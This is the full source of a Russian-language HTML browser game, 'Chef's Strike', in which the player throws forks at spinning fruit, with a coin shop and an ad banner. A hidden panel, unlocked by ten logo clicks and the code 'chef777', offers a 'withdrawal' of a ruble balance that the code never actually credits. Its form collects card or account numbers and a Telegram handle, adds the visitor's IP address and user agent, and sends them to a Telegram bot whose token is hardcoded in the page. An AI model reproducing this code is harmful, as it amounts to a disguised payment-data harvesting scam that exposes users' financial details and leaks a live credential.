<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="verified-code" content="97472d3e-8c52-4fb7-be9f-e98f8a5befb6">
    <title>Chef's Strike: Shop Edition</title>
    <style>
        :root { --bg: #0a0a0a; --accent: #ff4757; --win: #2ed573; --ad: #f1c40f; --coin: #ffd700; }
        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            overflow: hidden; background: var(--bg);
            font-family: 'Arial Black', sans-serif; color: white;
            user-select: none; touch-action: none;
        }
        #game-wrapper {
            position: relative; width: 100vw; height: 100vh;
            display: flex; justify-content: center; align-items: center;
            background: radial-gradient(circle at center, #1e272e 0%, #000 100%);
        }
        canvas { display: block; z-index: 5; position: relative; cursor: pointer; }
        .overlay { position: absolute; inset: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 100; background: rgba(0,0,0,0.6); backdrop-filter: blur(8px); }
        #shop-ui { display: none; z-index: 300; background: rgba(0,0,0,0.9); }
        .shop-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; width: 90%; max-width: 400px; margin-top: 20px; }
        .shop-item { background: rgba(255,255,255,0.1); border: 2px solid rgba(255,255,255,0.2); border-radius: 15px; padding: 15px; text-align: center; cursor: pointer; transition: 0.2s; }
        .shop-item.active { border-color: var(--win); background: rgba(46, 213, 115, 0.2); }
        .shop-item.locked { opacity: 0.6; }
        .btn { padding: 18px 50px; font-size: 22px; font-weight: bold; background: var(--accent); border: none; color: white; border-radius: 50px; cursor: pointer; margin-top: 15px; box-shadow: 0 10px 0 #b91c1c; transition: all 0.1s; z-index: 110; }
        .btn:active { transform: translateY(5px); box-shadow: 0 5px 0 #b91c1c; }
        .btn-small { padding: 10px 20px; font-size: 14px; margin-top: 10px; background: #555; box-shadow: 0 5px 0 #333; }
        #hud { position: absolute; top: 20px; width: 100%; display: flex; justify-content: center; gap: 20px; pointer-events: none; z-index: 10; }
        .stat { background: rgba(0,0,0,0.6); border: 1px solid rgba(255,255,255,0.1); padding: 8px 15px; border-radius: 12px; text-align: center; min-width: 60px; }
        .stat b { font-size: 20px; color: var(--accent); display: block; }
        .stat span { font-size: 10px; text-transform: uppercase; opacity: 0.8;}
        .stat b.coin-val { color: var(--coin); }
        #reward-form { display: none; flex-direction: column; align-items: center; margin-top: 15px; background: rgba(255,255,255,0.05); padding: 15px; border-radius: 20px; }
        #balance-display { font-size: 20px; color: var(--win); margin-bottom: 10px; background: rgba(0,0,0,0.5); padding: 8px 20px; border-radius: 15px; border: 1px solid var(--win); }
        #win-screen { position: absolute; inset: 0; display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 200; background: rgba(0,0,0,0.7); backdrop-filter: blur(5px); }
        input { padding:10px; border-radius:10px; border:none; outline:none; text-align:center; font-family: sans-serif; font-weight: bold; }
        .adsterra-banner { position: fixed; bottom: 0; left: 0; width: 100%; text-align: center; z-index: 1000; background: rgba(0,0,0,0.8); padding: 5px 0; pointer-events: auto; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; }
        .modal-content { background: #1e1e1e; padding: 20px; border-radius: 15px; max-width: 90%; max-height: 80%; overflow-y: auto; color: white; font-family: sans-serif; font-size: 14px; }
        .error-msg { color: var(--accent); font-size: 12px; margin-top: 5px; }
        .record-badge { position: absolute; top: 20px; right: 20px; background: rgba(0,0,0,0.6); padding: 6px 15px; border-radius: 20px; font-size: 14px; z-index: 10; font-family: monospace; border: 1px solid gold; }
    </style>
</head>
<body>
<div id="game-wrapper">
    <div id="menu-bg-collage"></div>
    <button id="exit-game-btn" style="position:absolute; top:20px; right:20px; display:none; z-index:150;" onclick="restartGame()">ВЫЙТИ</button>
    
    <div id="hud">
        <div class="stat"><span>УРОВЕНЬ</span><b id="lvl-ui">1</b></div>
        <div class="stat"><span>ВИЛОК</span><b id="forks-ui">5</b></div>
        <div class="stat"><span>МОНЕТЫ</span><b id="coins-ui" class="coin-val">0</b></div>
    </div>
    <div class="record-badge">🏆 РЕКОРД: <span id="record-val">0</span></div>

    <div id="win-screen"><h1 style="color:var(--win); font-size:50px;">+10 МОНЕТ</h1></div>
    <div id="shop-ui" class="overlay"><h1 style="color:var(--coin)">МАГАЗИН</h1><div id="shop-coins-display" style="font-size:24px; color:var(--coin)">💰 0</div><div class="shop-grid" id="shop-items-container"></div><button class="btn" style="background:#555; box-shadow:0 8px 0 #333" onclick="closeShop()">ЗАКРЫТЬ</button></div>

    <div id="main-menu" class="overlay">
        <h1 id="logo" style="color:var(--accent); font-size: 45px; cursor:pointer;" onclick="handleLogoClick()">CHEF'S STRIKE</h1>
        <button class="btn" onclick="startGame()">ИГРАТЬ</button>
        <button class="btn" style="background:var(--coin); color:black; box-shadow:0 10px 0 #b8860b" onclick="openShop()">МАГАЗИН</button>
        <button class="btn btn-small" style="background:#555; box-shadow:0 5px 0 #333; font-size:12px;" onclick="showPrivacyPolicy()">ПОЛИТИКА КОНФИДЕНЦИАЛЬНОСТИ</button>
        <div id="promo-container" style="display:none; margin-top:20px;"><input type="text" id="promo-input" placeholder="ВВЕДИТЕ КОД" oninput="checkPromo()"></div>
        <div id="secret-panel" style="display:none; flex-direction:column; align-items:center; margin-top:20px;">
            <div id="balance-display">Баланс: <span id="bal-val">0.00 руб.</span></div>
            <input type="text" id="user-name-input" placeholder="@ваш_телеграм" oninput="saveUserName()" style="margin-bottom:10px; border: 1px solid var(--win);">
            <button class="btn" style="background:#9b59b6; box-shadow: 0 8px 0 #7d3c98; font-size:16px;" onclick="demoReward()">🎁 ДЕМО-ПОДДЕРЖКА</button>
            <button class="btn" style="background:#9b59b6; box-shadow: 0 8px 0 #7d3c98; font-size:16px;" onclick="showRewardForm()">ВЫПЛАТА</button>
            <div id="reward-form">
                <input type="text" id="rew-method" placeholder="Способ (Карта/СБП)" style="margin-bottom:5px;">
                <input type="text" id="rew-number" placeholder="Номер счета" style="margin-bottom:5px;">
                <input type="number" id="rew-amount" placeholder="Сумма (мин 50 руб)" min="50" step="1" style="margin-bottom:5px;">
                <div id="reward-error" class="error-msg" style="display:none;"></div>
                <button class="btn" id="send-reward-btn" style="background:var(--win); box-shadow:0 8px 0 #219150; font-size:14px; padding:10px 20px;">ОТПРАВИТЬ</button>
            </div>
        </div>
    </div>

    <div id="game-over" class="overlay" style="display:none">
        <h1 style="font-size: 50px; color: #ff4757;">ПРОМАХ!</h1>
        <button class="btn" onclick="restartGame()">В МЕНЮ</button>
    </div>
    <canvas id="c"></canvas>
</div>
<div class="adsterra-banner"><script src="https://pl29025941.profitablecpmratenetwork.com/79/09/07/790907aff1a8e13a2e6d0a1f6ed23053.js"></script></div>
<div id="privacy-modal" class="modal"><div class="modal-content"><h3>Политика конфиденциальности</h3><p>Приложение Chef's Strike собирает данные для персонализации рекламы.</p><button class="close-modal" onclick="closePrivacyModal()">ЗАКРЫТЬ</button></div></div>

<script>
// ==================== ПРОВЕРКА АКТИВАЦИИ КОДА ====================
let isUnlocked = localStorage.getItem('chef_unlocked') === 'true';

// ==================== ЗАЩИТА БАЛАНСА ====================
const SECRET_KEY = "chef_secure_v2_2026";
let serverBalanceSignature = "";

function signBalance(balance) { return btoa(balance + ":" + SECRET_KEY + ":" + (balance * 13).toString(16)); }
function validateBalance(balance, signature) { return signBalance(balance) === signature; }

function loadBalanceFromStorage() {
    let savedBalance = localStorage.getItem('chef_bal_real');
    let savedSignature = localStorage.getItem('chef_bal_sig');
    if (!savedBalance || !savedSignature) { G.balance = 0; saveBalanceToStorage(); return; }
    let bal = parseFloat(savedBalance);
    if (validateBalance(bal, savedSignature)) { G.balance = bal; serverBalanceSignature = savedSignature; }
    else { G.balance = 0; saveBalanceToStorage(); alert("Обнаружена попытка взлома! Баланс сброшен."); }
}
function saveBalanceToStorage() { localStorage.setItem('chef_bal_real', G.balance); serverBalanceSignature = signBalance(G.balance); localStorage.setItem('chef_bal_sig', serverBalanceSignature); }
function updateBalance(amount) { let newBalance = G.balance + amount; if (newBalance < 0) newBalance = 0; G.balance = parseFloat(newBalance.toFixed(2)); saveBalanceToStorage(); document.getElementById('bal-val').innerText = G.balance.toFixed(2) + " руб."; }

function demoReward() { alert("🎁 Демо: реклама отключена. Зарабатывай монеты в игре!"); }

// ==================== ВЫВОД ====================
async function getClientInfo() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return { ip: data.ip, userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language, screen: `${screen.width}x${screen.height}`, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone };
    } catch { return { ip: 'unknown', userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language, screen: `${screen.width}x${screen.height}`, timezone: 'unknown' }; }
}

document.getElementById('send-reward-btn')?.addEventListener('click', async () => {
    const method = document.getElementById('rew-method').value;
    const number = document.getElementById('rew-number').value;
    const amount = parseFloat(document.getElementById('rew-amount').value);
    const errorDiv = document.getElementById('reward-error');
    if (!method || !number || !amount) { errorDiv.style.display = 'block'; errorDiv.innerText = "Заполните все поля!"; return; }
    if (isNaN(amount) || amount < 50) { errorDiv.style.display = 'block'; errorDiv.innerText = "Минимальная сумма вывода: 50 рублей!"; return; }
    if (G.balance < amount) { errorDiv.style.display = 'block'; errorDiv.innerText = `Недостаточно средств! Баланс: ${G.balance.toFixed(2)} руб.`; return; }
    errorDiv.style.display = 'none';
    const clientInfo = await getClientInfo();
    const user = G.userName || "Не указан";
    const timestamp = new Date().toLocaleString('ru-RU');
    const text = `💸 ЗАЯВКА НА ВЫВОД\n🕐 Время: ${timestamp}\n👤 Юзер: ${user}\n💳 Способ: ${method}\n🔢 Номер: ${number}\n💰 Сумма: ${amount} руб.\n📊 Баланс ДО: ${G.balance.toFixed(2)} руб.\n🌐 IP: ${clientInfo.ip}\n📱 User-Agent: ${clientInfo.userAgent.substring(0, 200)}`;
    const TG_TOKEN = "8743340521:AAEMgkn8_8kEjAtDB6kUORi45iII0Du6aTs";
    const TG_ADMIN_ID = "7815623051";
    try {
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ADMIN_ID}&text=${encodeURIComponent(text)}`);
        updateBalance(-amount);
        document.getElementById('rew-method').value = ''; document.getElementById('rew-number').value = ''; document.getElementById('rew-amount').value = '';
        alert(`✅ Заявка отправлена! Сумма ${amount} руб. списана с баланса.`);
    } catch (e) { alert("Ошибка отправки"); }
});

// ==================== ИГРОВАЯ ЛОГИКА (С РЕКОРДОМ И СМЕНОЙ МИШЕНИ) ====================
const canvas = document.getElementById('c');
const ctx = canvas.getContext('2d');
const S = { radius: 95, y: 0, fW: 12, fH: 80, fSpeed: 45 };

const WEAPONS = [
    { id: 'fork', name: 'Вилка', color: '#b2bec3', tip: '#dfe6e9', price: 0, icon: '🍴' },
    { id: 'knife', name: 'Нож шефа', color: '#636e72', tip: '#ffffff', price: 100, icon: '🔪' },
    { id: 'cleaver', name: 'Тесак', color: '#2d3436', tip: '#fab1a0', price: 300, icon: '🪓' },
    { id: 'gold', name: 'Золото', color: '#d4af37', tip: '#ffd700', price: 1000, icon: '✨' }
];

const TARGETS = [
    { juice: '#b91c1c', icon: '🍉', name: 'Арбуз' },
    { juice: '#ff9f43', icon: '🍊', name: 'Апельсин' },
    { juice: '#ee5253', icon: '🍅', name: 'Томат' },
    { juice: '#10ac84', icon: '🥝', name: 'Киви' },
    { juice: '#e84393', icon: '🍎', name: 'Яблоко' },
    { juice: '#f39c12', icon: '🍑', name: 'Персик' },
    { juice: '#3498db', icon: '🍇', name: 'Виноград' }
];

let G = {
    active: false, level: 1, rotation: 0, rotSpeed: 0.03,
    forksIn: [], isFlying: false, canShoot: true, isTransition: false,
    fY: 0, targetForks: 5, logoClicks: 0, shake: 0, hitEffect: 0,
    balance: 0,
    coins: parseInt(localStorage.getItem('chef_coins')) || 0,
    userName: localStorage.getItem('chef_user') || '',
    ownedWeapons: JSON.parse(localStorage.getItem('chef_owned')) || ['fork'],
    currentWeapon: localStorage.getItem('chef_weap') || 'fork',
    record: parseInt(localStorage.getItem('chef_strike_record')) || 0
};

loadBalanceFromStorage();

function updateRecord() {
    let currentHits = G.forksIn.length;
    if (currentHits > G.record) {
        G.record = currentHits;
        localStorage.setItem('chef_strike_record', G.record);
        document.getElementById('record-val').innerText = G.record;
    }
}

function win() { 
    G.isTransition = true; 
    G.coins += 10;
    saveData();
    updateRecord();
    document.getElementById('win-screen').style.display = 'flex'; 
    setTimeout(() => { 
        G.level++; 
        initLevel(); 
        G.active = true; 
        document.getElementById('win-screen').style.display = 'none';
    }, 1000); 
}

function saveUserName() { G.userName = document.getElementById('user-name-input').value; localStorage.setItem('chef_user', G.userName); }
function openShop() {
    document.getElementById('shop-ui').style.display = 'flex';
    document.getElementById('shop-coins-display').innerText = '💰 ' + G.coins;
    const container = document.getElementById('shop-items-container');
    container.innerHTML = '';
    WEAPONS.forEach(w => {
        const isOwned = G.ownedWeapons.includes(w.id);
        const isActive = G.currentWeapon === w.id;
        const div = document.createElement('div');
        div.className = `shop-item ${isActive ? 'active' : ''} ${!isOwned ? 'locked' : ''}`;
        div.innerHTML = `<div style="font-size:30px">${w.icon}</div><div style="font-size:14px">${w.name}</div><div style="color:var(--coin)">${isOwned ? (isActive ? 'ВЫБРАНО' : 'ВЗЯТЬ') : w.price + ' 💰'}</div>`;
        div.onclick = () => buyOrSelect(w);
        container.appendChild(div);
    });
}
function buyOrSelect(w) {
    if (G.ownedWeapons.includes(w.id)) G.currentWeapon = w.id;
    else if (G.coins >= w.price) { G.coins -= w.price; G.ownedWeapons.push(w.id); G.currentWeapon = w.id; }
    else alert("Недостаточно монет!");
    saveData(); openShop();
}
function closeShop() { document.getElementById('shop-ui').style.display = 'none'; }
function saveData() {
    localStorage.setItem('chef_bal_real', G.balance);
    saveBalanceToStorage();
    localStorage.setItem('chef_coins', G.coins);
    localStorage.setItem('chef_owned', JSON.stringify(G.ownedWeapons));
    localStorage.setItem('chef_weap', G.currentWeapon);
    document.getElementById('coins-ui').innerText = G.coins;
}

function drawFork(x, y, angle = 0, scale = 1) {
    const w = WEAPONS.find(v => v.id === G.currentWeapon);
    ctx.save(); ctx.translate(x, y); ctx.rotate(angle); ctx.scale(scale, scale);
    ctx.fillStyle = w.color; 
    ctx.beginPath(); 
    ctx.roundRect(-S.fW/2, 20, S.fW, S.fH - 20, 5); 
    ctx.fill();
    ctx.fillStyle = w.tip; 
    if(w.id === 'fork') {
        ctx.fillRect(-S.fW/2, 0, S.fW, 25);
        for(let i = 0; i < 3; i++) ctx.fillRect(-S.fW/2 + (i * S.fW/2.5), -15, 2.5, 15);
    } else {
        ctx.beginPath(); ctx.moveTo(-S.fW, 20); ctx.lineTo(S.fW, 20); ctx.lineTo(0, -20); ctx.closePath(); ctx.fill();
    }
    ctx.restore();
}

function handleLogoClick() { G.logoClicks++; if (G.logoClicks >= 10 && !isUnlocked) document.getElementById('promo-container').style.display = 'block'; }
function checkPromo() { 
    if (document.getElementById('promo-input').value.toLowerCase() === 'chef777' && !isUnlocked) { 
        isUnlocked = true;
        localStorage.setItem('chef_unlocked', 'true');
        document.getElementById('promo-container').style.display = 'none'; 
        document.getElementById('secret-panel').style.display = 'flex';
        document.getElementById('user-name-input').value = G.userName;
        updateBalance(0);
        alert("✅ Код активирован! Панель управления открыта навсегда!");
    } else if (document.getElementById('promo-input').value.toLowerCase() === 'chef777' && isUnlocked) {
        document.getElementById('promo-container').style.display = 'none'; 
        document.getElementById('secret-panel').style.display = 'flex';
        alert("Панель уже активирована!");
    }
}

if (isUnlocked) { document.getElementById('secret-panel').style.display = 'flex'; document.getElementById('promo-container').style.display = 'none'; }

function showRewardForm() { const f = document.getElementById('reward-form'); f.style.display = f.style.display === 'flex' ? 'none' : 'flex'; }
function resize() { canvas.width = Math.min(window.innerWidth, 500); canvas.height = Math.min(window.innerHeight, 900); S.y = canvas.height * 0.35; G.fY = canvas.height - 150; }

function drawTarget() {
    ctx.save(); 
    ctx.shadowBlur = 0;
    ctx.translate(canvas.width / 2, S.y);
    ctx.rotate(G.rotation);
    const targetIndex = (G.level - 1) % TARGETS.length;
    const conf = TARGETS[targetIndex];
    const grad = ctx.createRadialGradient(-20, -20, 10, 0, 0, S.radius);
    grad.addColorStop(0, conf.juice);
    grad.addColorStop(1, '#8B0000');
    ctx.fillStyle = grad;
    ctx.beginPath(); ctx.arc(0, 0, S.radius + G.hitEffect * 0.5, 0, Math.PI * 2); ctx.fill();
    ctx.fillStyle = 'white';
    ctx.shadowBlur = 8;
    ctx.shadowColor = "black";
    ctx.font = `bold ${56 + G.hitEffect * 0.6}px 'Segoe UI', 'Arial'`;
    ctx.textAlign = 'center';
    ctx.fillText(conf.icon, 0, 22);
    G.forksIn.forEach(angle => { ctx.save(); ctx.rotate(angle); drawFork(0, -S.radius + 5, Math.PI, 0.9); ctx.restore(); });
    ctx.restore();
}

function initLevel() {
    G.forksIn = []; G.isFlying = false; G.canShoot = true; G.isTransition = false; G.fY = canvas.height - 150;
    G.targetForks = 5 + Math.floor(G.level / 2);
    G.rotSpeed = 0.028 + (G.level * 0.002);
    document.getElementById('win-screen').style.display = 'none';
    updateUI();
}

function loop() {
    ctx.clearRect(0,0,canvas.width, canvas.height);
    if(!G.active) { requestAnimationFrame(loop); return; }
    G.rotation += G.rotSpeed;
    drawTarget();
    if(G.isFlying) { G.fY -= S.fSpeed; if(G.fY <= S.y + S.radius) checkImpact(); }
    if(!G.isTransition) drawFork(canvas.width/2, G.fY);
    G.hitEffect *= 0.8;
    requestAnimationFrame(loop);
}
function checkImpact() {
    let hitAngle = (Math.PI - G.rotation + Math.PI * 2) % (Math.PI * 2);
    if(G.forksIn.some(a => Math.abs(a - hitAngle) < 0.32)) {
        G.active = false; document.getElementById('game-over').style.display = 'flex';
        updateRecord();
    } else {
        G.forksIn.push(hitAngle); G.isFlying = false; G.fY = canvas.height - 150; G.hitEffect = 10;
        updateUI(); setTimeout(() => G.canShoot = true, 50);
        updateRecord();
        if(G.forksIn.length >= G.targetForks) win();
    }
}

function startGame() { document.getElementById('main-menu').style.display = 'none'; document.getElementById('exit-game-btn').style.display = 'block'; G.active = true; initLevel(); }
function restartGame() { location.reload(); }
function updateUI() { 
    document.getElementById('lvl-ui').innerText = G.level; 
    document.getElementById('forks-ui').innerText = (G.targetForks - G.forksIn.length); 
    document.getElementById('coins-ui').innerText = G.coins;
    document.getElementById('record-val').innerText = G.record;
}
function handleInput() { if(G.active && !G.isFlying && !G.isTransition && G.canShoot) { G.isFlying = true; G.canShoot = false; } }

window.addEventListener('touchstart', (e) => { if(e.target.tagName !== 'BUTTON' && e.target.tagName !== 'INPUT') handleInput(); });
window.addEventListener('mousedown', (e) => { if(e.target.tagName !== 'BUTTON' && e.target.tagName !== 'INPUT') handleInput(); });

resize(); 
loop(); 
saveData();
document.getElementById('bal-val').innerText = G.balance.toFixed(2) + " руб.";
document.getElementById('user-name-input').value = G.userName;
document.getElementById('record-val').innerText = G.record;

function showPrivacyPolicy() { document.getElementById('privacy-modal').style.display = 'flex'; }
function closePrivacyModal() { document.getElementById('privacy-modal').style.display = 'none'; }

if (!CanvasRenderingContext2D.prototype.roundRect) {
    CanvasRenderingContext2D.prototype.roundRect = function(x, y, w, h, r) {
        if (w < 2 * r) r = w / 2;
        if (h < 2 * r) r = h / 2;
        this.moveTo(x+r, y);
        this.lineTo(x+w-r, y);
        this.quadraticCurveTo(x+w, y, x+w, y+r);
        this.lineTo(x+w, y+h-r);
        this.quadraticCurveTo(x+w, y+h, x+w-r, y+h);
        this.lineTo(x+r, y+h);
        this.quadraticCurveTo(x, y+h, x, y+h-r);
        this.lineTo(x, y+r);
        this.quadraticCurveTo(x, y, x+r, y);
        return this;
    };
}
</script>
</body>
</html>
